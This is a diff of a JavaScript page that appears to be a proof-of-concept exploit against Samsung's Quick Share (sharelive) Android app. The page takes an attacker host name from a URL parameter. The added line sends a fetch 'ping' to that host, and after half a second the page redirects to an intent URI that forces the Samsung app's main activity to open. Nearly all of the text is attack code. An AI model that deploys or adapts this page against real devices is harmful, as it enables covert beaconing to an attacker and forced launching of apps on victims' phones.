@@ -3,6 +3,8 @@ var yayquerystringyay = window.location.search;
 var yayurlparamsyay = new URLSearchParams(yayquerystringyay); 
 var yayattackeryay = yayurlparamsyay.get('yayattackeryay'); 
 
+fetch("http://" + yayattackeryay + "/ping");
+    
 setTimeout(function(){
     location.href="intent://#Intent;component=com.samsung.android.app.sharelive/.presentation.main.MainActivity;end;";
 }, 500);
